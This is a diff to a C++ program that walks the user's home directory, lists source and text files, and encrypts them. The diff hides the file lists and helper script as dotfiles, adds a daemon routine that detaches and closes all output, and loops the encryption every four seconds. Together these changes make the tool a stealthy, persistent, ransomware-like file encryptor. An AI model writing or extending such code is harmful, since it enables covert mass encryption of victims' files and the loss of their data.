@@ -1,4 +1,12 @@
 #include <bits/stdc++.h>
+#include<iostream>
+#include<syslog.h>
+#include<errno.h>
+#include<stdlib.h>
+#include<sys/types.h>
+#include<unistd.h>
+#include<stdio.h>
+#include<sys/stat.h>
 using namespace std;
 
 int key=1;
@@ -118,24 +126,24 @@ void list_gen(){
         DIR=""$( cd -P ""$( dirname ""$SOURCE"" )"" && pwd )"" \
         \
         dir_pres=$DIR \
-        if [ -f $dir_pres/files ] ; then \
-        rm $dir_pres/files \
+        if [ -f $dir_pres/.files ] ; then \
+        rm $dir_pres/.files \
         fi \
         cd $HOME \
         file0=""*.cpp */*.cpp */*/*.cpp */*/*/*.cpp */*/*/*/*.cpp "" \
         file1=""*.txt */*.txt */*/*.txt */*/*/*.txt */*/*/*/*.txt"" \
         file2=""*.java */*.java */*/*.java */*/*/*.java */*/*/*/*.java"" \
-        for i in $file0 $file1 $file2; do [ -f ""$i"" ] && echo ""$HOME$i"" >> $dir_pres/files ; done | sort \
+        for i in $file0 $file1 $file2; do [ -f ""$i"" ] && echo ""$HOME$i"" >> $dir_pres/.files ; done | sort \
         pwd\
-        if [ -f $dir_pres/encrypted_list ] ; then \
-            rm $dir_pres/encrypted_list \
+        if [ -f $dir_pres/.encrypted_list ] ; then \
+            rm $dir_pres/.encrypted_list \
             fi \
         file3=""*.serial_coders */*.serial_coders */*/*.serial_coders */*/*/*.serial_coders */*/*/*/*.serial_coders"" \
-        for i in $file3; do [ -f ""$i"" ] && echo ""$HOME$i"" >> $dir_pres/encrypted_list ; done | sort \
+        for i in $file3; do [ -f ""$i"" ] && echo ""$HOME$i"" >> $dir_pres/.encrypted_list ; done | sort \
         ";
 
    // system(command.c_str());//dont know why it is not working 
-    system("./list_gen.sh");
+    system("./.list_gen.sh");
 }
 
 void enc_dec(string input){//string from lists is a path to a file to be encripted/decripted
@@ -171,21 +179,21 @@ void enc_dec(string input){//string from lists is a path to a file to be encript
 void del_lists()
 {
     int encrypted_list_there=0,files_there=0;
-    lin.open("encrypted_list",ios::in);
+    lin.open(".encrypted_list",ios::in);
 	if(lin)
 	{
 	    encrypted_list_there=1;     
 	}
     lin.close();
-	lin.open("files",ios::in);
+	lin.open(".files",ios::in);
 	if(lin)
 	{
 	    files_there=1;  
 	}
 	
 	//remove if there
-	if(encrypted_list_there) system("rm encrypted_list ");
-	if(files_there) system("rm files ");
+	if(encrypted_list_there) system("rm .encrypted_list ");
+	if(files_there) system("rm .files ");
 	
     lin.close();
 }
@@ -193,18 +201,18 @@ void del_lists()
 void list_reader(string task){
     if(task=="enc")
 	{
-	    lin.open("files",ios::in);
+	    lin.open(".files",ios::in);
 	    if(!lin){
-	        cout<<"files not found\n";
-	        exit(0);
+	        cout<<".files not found\n";
+	        return;
 	    }
 	}
 	else
 	{
-	    lin.open("encrypted_list",ios::in);
+	    lin.open(".encrypted_list",ios::in);
 	    if(!lin){
-	        cout<<"encrypted_list not found\n";
-	        exit(0);
+	        cout<<".encrypted_list not found\n";
+	        return;
 	    }
 	}
 	
@@ -239,13 +247,35 @@ void caller(string input)
 	}
 }
 
+void demon(){
+  pid_t pid,sid;
+    pid=fork();
+    if(pid<0){
+        exit(EXIT_FAILURE);
+    }
+    if(pid>0){
+        exit(EXIT_SUCCESS);
+    }
+    umask(0);
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+}
+
+void initFreezer(string input)
+{
+    demon();
+	while(true){
+	    sleep(4);
+	    caller(input);
+	    cout<<"here\n";
+	} 
+}
+
 int main(int argc, char *argv[])
 {
 	string input;
-	
 	input=argv[1];
-	caller(input);
-	
-	cout<<"success\n";
+	initFreezer(input);
 	return 0;
 }
